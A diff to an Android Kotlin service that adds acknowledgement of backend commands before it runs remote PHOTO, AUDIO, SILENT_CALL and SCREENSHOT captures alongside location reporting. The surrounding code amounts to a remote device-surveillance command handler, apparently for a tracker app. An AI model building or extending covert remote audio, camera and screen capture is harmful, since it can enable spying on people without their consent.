@@ -491,6 +491,13 @@ class TracerLocationService : Service() {
         prefs.edit().putString(KEY_PENDING_RESULTS, failed.joinToString("\n")).apply()
     }
 
+    // Confirma la recepción del comando (pending -> dispatched) para que el
+    // backend no lo re-entregue mientras la captura asíncrona está en curso.
+    private suspend fun ackSafe(cmdId: Long) {
+        runCatching { apiService.ackCommand(TracerApiService.AUTH_TOKEN, cmdId) }
+            .onFailure { Log.w(TAG, "ack no enviado cmdId=$cmdId: ${it.message}") }
+    }
+
     // Intenta subir el resultado; si falla por red, lo encola para el próximo ciclo
     private fun postResultSafe(cmdId: Long, result: String) {
         serviceScope.launch {
@@ -543,6 +550,7 @@ class TracerLocationService : Service() {
                         postResultSafe(cmd.id, "Tracer LOCATE: ubicacion enviada")
                     }
                     "PHOTO" -> {
+                        ackSafe(cmd.id)
                         val intent = Intent(this@TracerLocationService, TracerLocationService::class.java).apply {
                             action = ACTION_TAKE_PHOTO
                             putExtra(EXTRA_REPLY_TO, "remote")
@@ -551,6 +559,7 @@ class TracerLocationService : Service() {
                         startService(intent)
                     }
                     "AUDIO", "SILENT_CALL" -> {
+                        ackSafe(cmd.id)
                         val duration = if (cmd.command.uppercase() == "SILENT_CALL") 60
                                        else cmd.args.trim().toIntOrNull()?.coerceIn(10, 300) ?: 60
                         val intent = Intent(this@TracerLocationService, TracerLocationService::class.java).apply {
@@ -562,6 +571,7 @@ class TracerLocationService : Service() {
                         startService(intent)
                     }
                     "SCREENSHOT" -> {
+                        ackSafe(cmd.id)
                         val intent = Intent(this@TracerLocationService, TracerLocationService::class.java).apply {
                             action = ACTION_TAKE_SCREENSHOT
                             putExtra(EXTRA_REPLY_TO, "remote")
